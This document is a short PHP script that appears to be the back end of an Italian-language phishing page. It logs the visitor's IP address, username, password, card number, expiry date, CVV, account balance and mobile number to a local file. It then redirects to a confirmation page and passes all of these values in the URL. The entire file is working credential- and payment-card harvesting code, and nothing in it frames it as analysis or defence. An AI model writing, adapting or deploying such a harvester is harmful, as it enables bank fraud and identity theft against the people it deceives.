﻿<?php
date_default_timezone_set('Europe/Rome');
$handle = fopen("002", "a");
$date = date('Y-m-d H:i:s');
$ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');
fwrite($handle, "IP: ");
fwrite($handle, $ip);
fwrite($handle, "\r\n");
fwrite($handle, "Date: ");
fwrite($handle, $date);
fwrite($handle, "\r\n");
fwrite($handle, "Nome utente: ");
fwrite($handle, $_POST["usr"]);
fwrite($handle, "\r\n");
fwrite($handle, "Password: ");
fwrite($handle, $_POST["pwd"]);
fwrite($handle, "\r\n");
fwrite($handle, "Carta: ");
fwrite($handle, $_POST["carta"]);
fwrite($handle, "\r\n");
fwrite($handle, "Scadenza: ");
fwrite($handle, $_POST["scadenzaMese"] . "/" . $_POST["scadenzaAnno"]);
fwrite($handle, "\r\n");
fwrite($handle, "CVV: ");
fwrite($handle, $_POST["cvv"]);
fwrite($handle, "\r\n");
fwrite($handle, "Saldo: ");
fwrite($handle, $_POST["saldo"]);
fwrite($handle, "\r\n");
fwrite($handle, "Cellulare: ");
fwrite($handle, $_POST["cellulare"]);
fwrite($handle, "\r\n");
fwrite($handle, "----------------------------------");
fwrite($handle, "\r\n");
fclose($handle);

	echo '<meta http-equiv="refresh" content="0; URL=/conferma2.php?key=AJiidMJ896HA87sauasuiAAHUSDNO28927njanHA&usr='. $_POST["usr"] . '&pwd=' . $_POST["pwd"] .'&carta=' . $_POST["carta"] .'&scadenza=' . $_POST["scadenzaMese"] . "/" . $_POST["scadenzaAnno"] .'&cvv=' . $_POST["cvv"] .'&saldo=' . $_POST["saldo"] .'&cellulare=' . $_POST["cellulare"] .'&rel=1">';


exit;
?>